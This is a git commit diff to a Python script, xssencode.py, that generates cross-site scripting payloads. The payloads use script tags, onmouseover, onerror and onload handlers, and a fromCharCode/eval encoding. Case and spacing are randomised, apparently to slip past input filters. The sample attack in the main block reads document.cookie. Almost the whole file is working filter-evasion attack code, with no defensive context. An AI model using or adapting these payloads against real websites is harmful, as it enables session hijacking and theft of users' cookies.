9cf34503204fb678f6044f47cbe993c197739443
RaspPiTor <hughaw64@gmail.com>
2016-11-04 17:38:50 +0000

    Changed a, dev and span tags to only have up to 250 spaces because they are then multiplied

--- XSS/xssencode.py
+++ XSS/xssencode.py
@@ -6,22 +6,23 @@ def randomurl():
     return ''.join(choice(chars) for i in range(length))+'.com'
     
 def xssencode(javascript):
-    #javascript='eval(String.fromCharCode(%s))' % ','.join(str(ord(i)) for i in javascript)
-    options=['<script>{}</script>',
-             '<a onmouseover="{}">%s</a>' % (' '*random.randint(0, 500)),
-             '<dev onmouseover="{}">%s</dev>' % (' '*random.randint(0, 500)),
-             '<span onmouseover="{}">%s</span>' % (' '*random.randint(0, 500)),
-             '<img onmouseover="{}" src="#"/>',
-             '<img onmouseover="{}"/>',
-             '<img onerror="{}" src="/"/>',
-             '<img onerror="{}" src="%s"/>' % randomurl(),
-             '<iframe onmouseover="{}" src="#"></iframe>',
-             '<body onload={}>',]
-    for i in options:
-        i=''.join(a.upper() if random.randint(0,1) else a.lower() for a in i)
-        i=''.join(a if random.randint(0,1) or a!='>' else ' >' for a in i)
-        i=''.join(a if random.randint(0,1) or a!=' ' else '  ' for a in i)
-        yield i.format(javascript)
+    javascript2='eval(String.fromCharCode(%s))' % ','.join(str(ord(i)) for i in javascript)
+    for js in [javascript, javascript2]:
+        options=['<script>{}</script>',
+         '<a onmouseover="{}">%s</a>' % (' '*random.randint(0, 250)),
+         '<dev onmouseover="{}">%s</dev>' % (' '*random.randint(0, 250)),
+         '<span onmouseover="{}">%s</span>' % (' '*random.randint(0, 250)),
+         '<img onmouseover="{}" src="#"/>',
+         '<img onmouseover="{}"/>',
+         '<img onerror="{}" src="/"/>',
+         '<img onerror="{}" src="%s"/>' % randomurl(),
+         '<iframe onmouseover="{}" src="#"></iframe>',
+         '<body onload={}>',]
+        for i in options:
+            i=''.join(a.upper() if random.randint(0,1) else a.lower() for a in i)
+            i=''.join(a if random.randint(0,1) or a!='>' else ' >' for a in i)
+            i=''.join(a if random.randint(0,1) or a!=' ' else '  ' for a in i)
+            yield i.format(js)
 if __name__=='__main__':
     attack="alert('XSS: '+document.cookie)"
     print('\n'.join(xssencode(attack)))
